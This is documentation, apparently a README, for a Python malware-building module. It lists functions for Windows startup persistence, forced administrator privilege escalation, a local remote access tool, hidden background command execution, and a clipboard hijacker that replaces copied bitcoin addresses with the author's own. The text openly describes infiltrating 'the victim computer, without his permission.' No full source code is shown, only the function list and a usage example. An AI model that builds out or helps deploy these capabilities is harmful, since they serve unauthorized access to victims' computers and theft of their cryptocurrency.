|--------------------------------------------------------------------------------|
|   ______                                      _        _   _                   |
|   |  _  \                                    | |      | | (_)                  |
|   | | | |___   ___ _   _ _ __ ___   ___ _ __ | |_ __ _| |_ _  ___  _ __        |
|   | | | / _ \ / __| | | | '_   _ \ / _ \ '_ \| __/ _  | __| |/ _ \| '_ \       |
|   | |/ / (_) | (__| |_| | | | | | |  __/ | | | || (_| | |_| | (_) | | | |  _   |
|   |___/ \___/ \___|\__,_|_| |_| |_|\___|_| |_|\__\__,_|\__|_|\___/|_| |_| (_)  |
|                                                                                |
|--------------------------------------------------------------------------------|


_________________________________________________________________________________________________                                        
                        ,--.,--.  ,--.,------. ,-----.  ,---.   
                        |  ||  ,'.|  ||  .---''  .-.  ''   .-'  
                        |  ||  |' '  ||  `--, |  | |  |`.  `-.  
                        |  ||  | `   ||  |`   '  '-'  '.-'    | 
                        `--'`--'  `--'`--'     `-----' `-----'  
__________________________________________________________________________________________________

This "module" was created by Keke712, 06/2019.
Youtube channel: https://www.youtube.com/channel/UCozygkvAzarlNmKpSGT4jWQ

If I do not speak English well, you must understand that I speak French, usually.

In functions, app = Virus(?,?)

What's a R.A.T -->
    Remote Access Tool - A rat allows you to infiltrate in the victim computer, without his permission.

_________________________________________________________________________________________________
                    ,--. ,--. ,---.    ,---.   ,----.   ,------. 
                    |  | |  |'   .-'  /  O  \ '  .-./   |  .---' 
                    |  | |  |`.  `-. |  .-.  ||  | .---.|  `--,  
                    '  '-'  '.-'    ||  | |  |'  '--'  ||  `---. 
                     `-----' `-----' `--' `--' `------' `------' 
_________________________________________________________________________________________________


Configure your application in a tuple same:

    app = Virus(
        on_startup(),
        "name_of_virus"
    )


_________________________________________________________________________________________________
        ,------.,--. ,--.,--.  ,--. ,-----.,--------.,--. ,-----. ,--.  ,--. ,---.   
        |  .---'|  | |  ||  ,'.|  |'  .--./'--.  .--'|  |'  .-.  '|  ,'.|  |'   .-'  
        |  `--, |  | |  ||  |' '  ||  |       |  |   |  ||  | |  ||  |' '  |`.  `-.  
        |  |`   '  '-'  '|  | `   |'  '--'\   |  |   |  |'  '-'  '|  | `   |.-'    | 
        `--'     `-----' `--'  `--' `-----'   `--'   `--' `-----' `--'  `--'`-----'  
_________________________________________________________________________________________________

get_executable():
    Get the application file.

get_executable_path():
    Get the path of the application file.

get_app_opt(app, request):
    Request must be "dest" or "name", when you have declared your Virus(?,?). Return destination or name.

on_startup()
    Return "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp".

exist_virus(app)
    Return True if the virus already exist in the victim's computer, else return False.

copy_virus(app)
    Copy the current folder of application.

create_shortcut(app)
    Create shortcut of the application.

is_admin()
    If the currrent app is ran with administrator privileges.

set_admin()
    Restart the application with administrator privileges.

force_admin()
    Force the application to pass administrator.

msgbox(title, content)
    Show a message box with informations you was put.

local_rat(app, special_command_prefix):
    Start a simple AND local R.A.T (Remote Access Tool). It's controlled by DOS commands.

bitcoin_paster(app, bitcoin_address):
    Change all copy > 30 AND begin per 1 into your bitcoin_address. This function is already in a loop.

get_clipboard():
    Get the current clipboard.

set_clipboard(string):
    Set to the clipboard the string you wanna set

clear_clipboard():
    Reset the clipboard (when victim press CTRL+V, nothing are paste).

exit_all():
    Exit all.

execute_command():
    Execute a command in command prompt in background (you don't see this).

is_param(string):
    If the two parameter of launch (python file.py parameter) is your string entered: return true, else: return false